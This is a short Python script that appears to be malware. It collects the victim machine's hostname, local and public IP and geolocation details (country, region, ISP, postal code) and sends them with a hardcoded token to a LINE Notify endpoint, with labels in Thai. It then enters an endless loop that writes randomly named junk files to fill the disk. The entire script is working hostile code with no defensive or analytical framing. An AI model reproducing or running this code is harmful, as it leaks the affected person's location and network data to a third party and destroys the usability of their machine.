import os
import socket
import time
import string
import random
import sys
try:
    import ipapi
except:
    os.system("pip3 install ipapi")

try:
    import requests
except:
    os.system("pip3 install requests")

from requests import get

ips = get('https://api.ipify.org').text
hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
site = ips
source = ipapi.location(ip=site, key=None)

mylist = ["gif", "png", "txt", "py", "js", "go", "exe", "dat", "rar", "lock"]

def id_generator(size=6, chars=string.ascii_letters + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

token = "ALBS90bWN5vOrMujdgylkiKTjA29YvLgWh0OruqhHiT"
uri = "https://notify-api.line.me/api/notify"
header = {"Authorization": "Bearer "+token}
msg = {"message": f"""
==========================
                    ชื่อเครื่อง 
{hostname} 
==========================
                    IP เน็ต 
{local_ip} 
==========================
                    IP เครื่อง  
{ips}
==========================
                    เมืองหลวง
{source["country_capital"]}
==========================
                    ภูมิภาค 
{source["region"]}
==========================
                    ID ประเทศ
{source["country"]}
==========================
                    ชื่อประเทศ
{source["country_name"]}
==========================
                    ภาษาในประเทศ
{source["languages"]}
==========================
                    ผู้ให้บริการเน็ต
{source["org"]}
==========================
                    รหัสเบอร์โทรประเทศ
{source["country_calling_code"]}       
==========================
                    รหัสไปรษณีย์
{source["postal"]}
==========================

"""}
resp = requests.post(uri,headers=header,data=msg)


print('Wait.....')

while True:

    fp = open(id_generator(100) +'.'+random.choice(mylist), 'w')
    fp.write(id_generator(100000))
    fp.close()
    time.sleep(0.0000000000000000000000000000000001)

sys.exit()